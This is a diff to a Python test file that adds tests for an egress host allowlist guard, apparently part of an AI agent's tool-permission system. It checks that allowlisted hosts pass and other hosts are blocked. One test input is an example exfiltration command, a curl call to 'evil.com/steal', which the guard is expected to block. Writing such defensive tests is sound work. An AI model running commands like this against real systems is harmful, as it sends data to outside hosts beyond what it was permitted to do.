@@ -212,6 +212,27 @@ async def test_egress_guard_allows_when_granted() -> None:
     assert await guard("run_command", {"command": "curl https://example.com"}) is None
 
 
+def test_envelope_egress_host_allowlist() -> None:
+    env = CapabilityEnvelope.from_tools(None, egress_allowed=True, egress_hosts=["github.com"])
+    assert env.egress_host_allowed("github.com") is True
+    assert env.egress_host_allowed("api.github.com") is True  # subdomain of a listed host
+    assert env.egress_host_allowed("evil.com") is False
+    # No allowlist = any host once egress is granted.
+    assert CapabilityEnvelope.from_tools(None, egress_allowed=True).egress_host_allowed("x.io")
+
+
+async def test_egress_guard_enforces_host_allowlist() -> None:
+    from app.tools.guards import make_egress_guard
+
+    env = CapabilityEnvelope.from_tools(None, egress_allowed=True, egress_hosts=["api.github.com"])
+    guard = make_egress_guard(env)
+    # An allowlisted host proceeds; a non-allowlisted one is blocked by name.
+    assert await guard("run_command", {"command": "curl https://api.github.com/repos"}) is None
+    blocked = await guard("run_command", {"command": "curl https://evil.com/steal"})
+    assert blocked is not None and blocked.status is ToolStatus.BLOCKED
+    assert "evil.com" in blocked.observation and "allowlist" in blocked.observation.lower()
+
+
 def test_interpreter_network_oneliners_are_flagged_for_egress() -> None:
     from app.tools.policy import network_command_reason
 
